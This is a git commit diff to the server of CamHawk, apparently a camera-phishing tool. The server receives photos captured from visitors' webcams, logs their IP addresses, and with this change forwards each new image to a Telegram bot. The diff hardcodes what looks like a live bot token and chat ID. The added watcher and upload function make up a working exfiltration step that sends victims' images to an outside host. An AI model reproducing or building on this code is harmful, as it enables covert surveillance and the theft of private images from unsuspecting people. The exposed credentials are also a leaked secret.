bcef23c11e94a4a3de6289b0e3a74c5e009493ab
mhdnijm41 <mhdnijmal@gmail.com>
2025-04-27 15:03:46 +0000

    eupdate

--- CamHawk/server.js
+++ CamHawk/server.js
@@ -1,9 +1,16 @@
-const express = require("express"); 
+const express = require("express");
 const fs = require("fs");
 const path = require("path");
+const axios = require("axios");
+const FormData = require("form-data");
+const chokidar = require("chokidar");
 
 const app = express();
 const PORT = 3000;
+
+// === Telegram Bot Config ===
+const telegramToken = '7970078573:AAEzOuBKiLnA8jDnKNzwKFZdRbSZzPNo2KA';
+const chatId = '7041065272';
 
 // Ensure the 'capture' directory exists
 const captureDir = path.join(__dirname, "capture");
@@ -13,6 +20,30 @@ if (!fs.existsSync(captureDir)) {
 
 app.use(express.static("templates"));
 app.use(express.json({ limit: "5mb" }));
+
+// Function to send image to Telegram
+function sendPhotoToTelegram(photoPath) {
+    const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("photo", fs.createReadStream(photoPath));
+
+    axios.post(url, formData, { headers: formData.getHeaders() })
+        .then(res => {
+            console.log(`Telegram: Sent ${path.basename(photoPath)}`);
+        })
+        .catch(err => {
+            console.error("Telegram error:", err.message);
+        });
+}
+
+// Watch capture folder for new images
+chokidar.watch(captureDir).on("add", (filePath) => {
+    if (/\.(jpg|jpeg|png|gif|png)$/i.test(filePath)) {
+        console.log(`[+] New file detected: ${filePath}`);
+        sendPhotoToTelegram(filePath);
+    }
+});
 
 // Handle image capture
 app.post("/capture", (req, res) => {
@@ -32,7 +63,7 @@ app.post("/capture", (req, res) => {
 
         console.log(`[+] Photo received! IP: ${userIP}`);
         fs.appendFileSync("server.log", `Photo received! IP: ${userIP}\n`);
-
+        res.sendStatus(200);
     });
 });
 
